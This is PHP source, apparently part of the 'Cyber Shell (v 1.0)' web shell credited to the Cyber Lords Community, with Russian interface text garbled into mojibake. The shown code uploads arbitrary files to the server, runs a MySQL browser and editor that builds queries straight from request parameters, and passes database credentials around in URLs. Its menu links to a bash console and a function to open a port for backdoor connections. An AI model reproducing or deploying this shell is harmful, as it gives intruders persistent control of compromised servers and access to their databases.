if (is_uploaded_file($userfile)) { 
$fi = "Çàêà÷åí ôàéë $userfile_name ðàçìåðîì $userfile_size áàéò â äèðåêòîðèþ $updir";
}
echo "$fi<br><a href='$PHP_SELF?d=$d&show&tupload'>Íàçàä ê êàòàëîãó</a>";
}
if (is_uploaded_file($userfile)) {
$dest=$updir.$userfile_name;
move_uploaded_file($userfile, $dest);
}}

if ((isset($db_server)) || (isset($db_user)) || (isset($db_pass))  ){
mysql_connect($db_server, $db_user, $db_pass) or die("íå ìîãó ïîäêëþ÷èòüñÿ ê áàçå");
}

if ((isset($dbname)) and (isset($table)) )
{
foreach($_POST as $var => $val)
if (substr($var,0,7) == 'newpole'){
if (substr($var,7,strlen($var)) !== ''){
$indif=substr($var,7,strlen($var));
echo " $val ";
mysql_select_db($dbname) or die("Íå ìîãó âûáðàòü áàçó äàííûõ");
if ($xvar == "") 
$xvar .= $indif;
else
$xvar .= ",".$indif;
if ($xval == "") 
$xval .= "'$val'";
else
$xval .= ",'$val'";
}}

if ($xvar != ""){
mysql_query("INSERT INTO $table ($xvar) values ($xval)");
}

echo "<a href=$PHP_SELF?showtables=$dbname&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>Íàçàä ê ñïèñêó òàáëèö ÁÄ:$dbname</a>";
mysql_select_db($dbname) or die("Íå ìîãó âûáðàòü áàçó äàííûõ");
$re=mysql_query("select * from $table");
echo "<table width='505' border='1' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCFF' bgcolor='#FFFFFF'>";

$res=mysql_fetch_array($re);
echo "<tr>";
if (count($res) > 1)
foreach($res as $var => $val){
$nvar=$var;
if ($nvar !== 0)
$nvar=$var+128945432;
if ($nvar == 128945432){
$var=untag($var);
echo "<td bgcolor='#CCCCFF' bordercolor='#FFFFFF'><center>$var</center></td>";
}}
echo "<td></td></tr>";

if (isset($_SESSION[limit]) and ($_SESSION[limit] !== "0"))
$param="limit $_SESSION[limit]";

$re=mysql_query("select * from $table $param");

while($res=mysql_fetch_array($re)){
echo "<tr>";
if (count($res) > 1)
foreach($res as $var => $val){
$nvar=$var;
if ($nvar !== 0)
$nvar=$var+128945432;
if (!$pixidname){
$pixidname=$var;
$pixid=$val;
}
if ($nvar == 128945432){
$valtext=untag($val);
if ($valtext == "") $valtext="=Ïóñòî=";


if ($_SESSION[lenth] == "on"){
if (strlen($valtext)>40){
$valtext=substr($valtext,0,40);
$valtext .="...";
}}

echo "<td><a href=$PHP_SELF?dbname=$dbname&mtable=$table&var=$var&pixidname=$pixidname&pixid=$pixid&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>$valtext</a></td>";
}}

echo "<td><a href=$PHP_SELF?dbname=$dbname&mtable=$table&pixidname=$pixidname&pixid=$pixid&db_server=$db_server&db_user=$db_user&db_pass=$db_pass&del>Óäàëèòü</a></td></tr>";
$pixidname='';
$pixid='';
}

echo "<form  action=\"$PHP_SELF\" method=\"POST\">";

$re=mysql_query("select * from $table");
$res=mysql_fetch_array($re);
echo "<tr>";
if (count($res) > 1)
foreach($res as $var => $val){
$nvar=$var;
if ($nvar !== 0)
$nvar=$var+128945432;
if ($nvar == 128945432){
$var=untag($var);
echo "<td bgcolor='#CCCCFF' bordercolor='#FFFFFF'><center>$var</center></td>";
}}
echo "<td></td></tr>";

$re=mysql_query("select * from $table");
$res=mysql_fetch_array($re);
echo "<tr>";
if (count($res) > 1)
foreach($res as $var => $val){
$nvar=$var;
if ($nvar !== 0)
$nvar=$var+128945432;
if ($nvar == 128945432){
$var=untag($var);
echo "<td bgcolor='#FFFFFF' bordercolor='#FFFFFF'><center><input type='text' name='newpole$var' value='$var' size='5'></center></td>";
}}
echo "</tr>";
echo "</table>";
echo "<input type=\"submit\"  value=\"Äîáàâèòü íîâóþ çàïèñü\" >";
echo "
<input type=\"hidden\" name=\"dbname\" value=\"$dbname\">
<input type=\"hidden\" name=\"table\" value=\"$table\">
<input type=\"hidden\" name=\"db_server\" value=\"$db_server\" >
<input type=\"hidden\" name=\"db_user\" value=\"$db_user\" >
<input type=\"hidden\" name=\"db_pass\" value=\"$db_pass\" >
";
echo "</form>";
}

if ((isset($dbname)) and (isset($mtable)) and (isset($pixidname)) and (isset($pixid)) and (isset($del))){
echo "hello";
mysql_select_db($dbname) or die("Íå ìîãó âûáðàòü áàçó äàííûõ");
mysql_query("delete from $mtable where $pixidname='$pixid'");
echo "<head><meta http-equiv=\"refresh\" content=\"0;URL=$PHP_SELF?dbname=$dbname&table=$mtable&db_server=$db_server&db_user=$db_user&db_pass=$db_pass\"></head>";
}

if ((isset($dbname)) and (isset($mtable)) and (isset($var)) and (isset($pixidname)) and (isset($pixid)) and (isset($textofmysql))){
mysql_select_db($dbname) or die("Íå ìîãó âûáðàòü áàçó äàííûõ");
mysql_query("update $mtable set $var='$textofmysql' where $pixidname=$pixid");
}

if ((isset($dbname)) and (isset($mtable)) and (isset($var)) and (isset($pixidname)) and (isset($pixid))){
mysql_select_db($dbname) or die("Íå ìîãó âûáðàòü áàçó äàííûõ");
$re=mysql_query("select $var from $mtable where $pixidname='$pixid'");
$res=mysql_fetch_array($re);
$text=untag($res[$var]);

echo "
<form  action=\"$PHP_SELF\" method=\"POST\">
<textarea name=\"textofmysql\" rows=\"25\" cols=\"60\" wrap=\"OFF\">$text</textarea>
<input type=\"hidden\" name=\"dbname\" value=\"$dbname\" >
<input type=\"hidden\" name=\"mtable\" value=\"$mtable\" >
<input type=\"hidden\" name=\"var\" value=\"$var\" >
<input type=\"hidden\" name=\"pixidname\" value=\"$pixidname\" >
<input type=\"hidden\" name=\"pixid\" value=\"$pixid\" >
<input type=\"hidden\" name=\"db_server\" value=\"$db_server\" >
<input type=\"hidden\" name=\"db_user\" value=\"$db_user\" >
<input type=\"hidden\" name=\"db_pass\" value=\"$db_pass\" >
<br><input type=\"submit\"  value=\"            Èçìåíèòü            \" >
</form>
<a href=$PHP_SELF?dbname=$dbname&table=$mtable&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>Âåðíóòüñÿ ê ñïèñêó</a>
";
}

if (isset($showdb) && empty($showtables)){
$re=mysql_query("show databases");
echo "<table width='505' border='1' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCFF' bgcolor='#FFFFFF'>";
echo "<tr><td><center><div style='background-color:#CCCCFF'><span class='style5'>Ñïèñîê äîñòóïíûõ ÁÄ:</span></div></center></td></tr>";
while($res=mysql_fetch_array($re)){
echo "<tr><td><center><a href=$PHP_SELF?showtables=$res[0]&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>$res[0]</a></center></td></tr>";
}
echo "</table>";
}
if (isset($showtables) and !empty($showtables)){

if (isset($xlimit)){
$_SESSION[limit]=$xlimit;
if (isset($xlenth))
$_SESSION[lenth]=$xlenth;
else $_SESSION[lenth]="";
}

echo "<a href=$PHP_SELF?showdb&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>Íàçàä ê ñïèñêó ÁÄ</a>";
$re=mysql_query("SHOW TABLES FROM $showtables");
echo "<table width='505' border='1' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCFF' bgcolor='#FFFFFF'>";
echo "<tr><td><center><div style='background-color:#CCCCFF'><span class='style5'>$showtables - Ñïèñîê òàáëèö: </span></div></center></td></tr>";
while($res=mysql_fetch_array($re)){
echo "<tr><td><center><a href=$PHP_SELF?dbname=$showtables&table=$res[0]&db_server=$db_server&db_user=$db_user&db_pass=$db_pass>$res[0]</a></td></tr>";
}
echo "</table>";

if (($_SESSION[lenth]) == "on")
$ch="checked";
else
$ch="";

echo <<< EOF
<form  action="$PHP_SELF" method="get">
<input type="hidden" name="showtables" value="$showtables" >
<input type="hidden" name="db_server" value="$db_server" >
<input type="hidden" name="db_user" value="$db_user" >
<input type="hidden" name="db_pass" value="$db_pass" >
îãðàíè÷åíèå íà êîëè÷åñòâî âûâîäèìûõ ïîëåé:<br>
<select name="xlimit">
  <option value="0">&#1055;&#1086;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1090;&#1100; &#1074;&#1089;&#1105;</option>
  <option value="10">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 10</option>
  <option value="20">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 20</option>
  <option value="30">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 30</option>
  <option value="50">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 50</option>
  <option value="100">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 100</option>
  <option value="200">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 200</option>
  <option value="500">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 500</option>
  <option value="1000">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 1000</option>
  <option value="5000">&#1055;&#1077;&#1088;&#1074;&#1099;&#1077; 5000</option>
</select>
<br>Âêëþ÷èòü îãðàíè÷åíèå íà äëèíó âûâîäèìûõ ïîëåé <input name="xlenth" type="checkbox" value="on" $ch><br>
<input type="submit"  value="Ïðèìåíèòü" >
EOF;
if (isset($_SESSION[limit]) and ($_SESSION[limit] !== "0"))
echo "<br>Òåêóùåå îãðàíè÷åíèå: $_SESSION[limit]";
}

if (isset($tools) or isset($tmysql))
echo "
<center>
<table width='505' border='0' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCCC'>
<tr height='10'>
<td align='center' bordercolor='#ECE9D8' bgcolor='#FFF8FF'>
.: MySQL :.
</td>
</tr height='10'>
<tr>
<td align='center' bordercolor='#ECE9D8' bgcolor='#FFFFFF'>
<form name='zapros' method='get' action=''>
<table width='505' border='0' align='center' cellpadding='0' cellspacing='0' bordercolor='#CCCCFF' bgcolor='#FFFFFF'>
<tr align='center' >
<td>
Host
</td>
<td>
<input name='db_server' type='text' value='localhost'>
</td>
</tr>
<tr align='center' >
<td>
Login MySQL
</td> 
<td>
<input type='text' name='db_user' value=''> 
</tr>
<tr align='center' >
<td>
Password MySQL
</td> 
<td>
<input type='text' name='db_pass' value=''>
<input type='hidden' name='showdb'>
</td> 
</tr>
<tr align='center' >
<td>
Èìÿ ÁÄ (íå îáÿçàòåëüíî)
</td> 
<td>
<input type='text' name='showtables' value=''>
</td> 
</tr>
<tr align='center' >
<td>
<input type='submit'>
</td>
<td>
<input type='reset'>
</td>
</tr>
</table>
</form>
</td>
</tr>
</table>
</center>
";
}
echo <<< EOF
<center>.:Cyber Shell (v 1.0):.<br>Copyright © <a href="http://www.cyberlords.net" target="_blank">Cyber Lords Community</a>, 2002-2006</center>
</td>
</tr>
</table>
EOF;

$d=tourl($d);
echo "
<center>
<span class='style1'>
<a href=$PHP_SELF?d=$d&diz&tmkdir>.: Ñîçäàòü ïàïêó :.</a>
<a href=$PHP_SELF?d=$d&diz&tmkfile>.: Ñîçäàòü ôàéë :.</a>
<a href=$PHP_SELF?d=$d&diz&tbackdoor>.: Îòêðûòü ïîðò äëÿ ïîäêëþ÷åíèÿ :.</a><br>
<a href=$PHP_SELF?d=$d&diz&tbash>.: Bash :.</a>
<a href=$PHP_SELF?d=$d&diz&tupload>.: Çàêà÷àòü ôàéë :.</a>
</span>
</center>
";
}
die;
?>
